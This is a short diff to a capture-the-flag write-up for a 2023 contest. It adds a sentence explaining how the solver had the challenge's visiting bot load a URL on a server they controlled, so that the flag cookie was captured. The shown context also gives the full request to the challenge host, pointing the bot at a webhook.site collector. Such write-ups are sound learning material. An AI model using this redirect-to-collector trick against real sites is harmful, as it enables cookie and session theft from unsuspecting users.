@@ -38,6 +38,8 @@ def visit():
             return "Invalid URL"
 ```
 
+This way, we can submit an url to a server we control, and the flag will be set as a cookie when the url is visited.
+
 Armed with the sacred URL `http://188.166.197.31:30016/visit?site=https%3A%2F%2Fwebhook.site%2Fe1208e41-fcf7-4a4f-b331-ff4da56265bf`, victory was ours!
 
 ![Screenshot of request bin](./blahajctf-2023/hi.png)
